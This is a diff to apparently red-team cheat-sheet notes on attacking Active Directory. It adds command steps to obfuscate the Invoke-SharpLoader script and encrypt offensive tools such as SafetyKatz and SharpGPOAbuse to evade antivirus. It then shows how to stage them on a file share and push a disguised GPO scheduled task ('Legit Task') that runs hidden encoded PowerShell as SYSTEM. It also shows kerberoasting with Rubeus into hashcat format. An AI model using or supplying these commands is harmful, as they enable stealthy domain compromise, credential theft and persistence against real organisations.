@@ -17,9 +17,27 @@ https://luemmelsec.github.io/Circumventing-Countermeasures-In-AD/
 SharpLoader
 https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader
 
+
+1. RUN https://github.com/the-xentropy/xencrypt on the loader to drop to a CIFS share on prem
+
+```
+Invoke-Xencrypt -infile C:\tools\Invoke-SharpLoader\Invoke-SharpLoader.ps1 -outfile C:\tools\Invoke-SharpLoader\Invoke-SharpLoader-OBFUSCATED.ps1 -Iterations 100
+```
+
+
+2. Then Encrypt SharpGPOAbuse as it gets flagged
 ```powershell
 Invoke-SharpEncrypt -file C:\CSharpFiles\SafetyKatz.exe -password S3cur3Th1sSh1t -outfile C:\CSharpEncrypted\SafetyKatz.enc
 ```
+
+Upload to CIFS share on prem where 'Invoke-SharpLoader-OBFUSCATED.ps1' was uploaded
+And decrypt/run with args
+
+```
+Assembly /assemblyname:"SharpGPOAbuse" /parameters:"--AddComputerTask --TaskName \"Legit Task\" --Author NT AUTHORITY\SYSTEM --Command \"cmd.exe\" --Arguments \"/c powershell -nop -w hidden -enc [...snip...]\" --GPOName \"Another Totally Legit GPO\""
+```
+
+
 ```powershell
 Invoke-SharpLoader -location C:\EncryptedCSharp\Rubeus.enc -password S3cur3Th1sSh1t -argument kerberoast -argument2 "/format:hashcat"
 ```
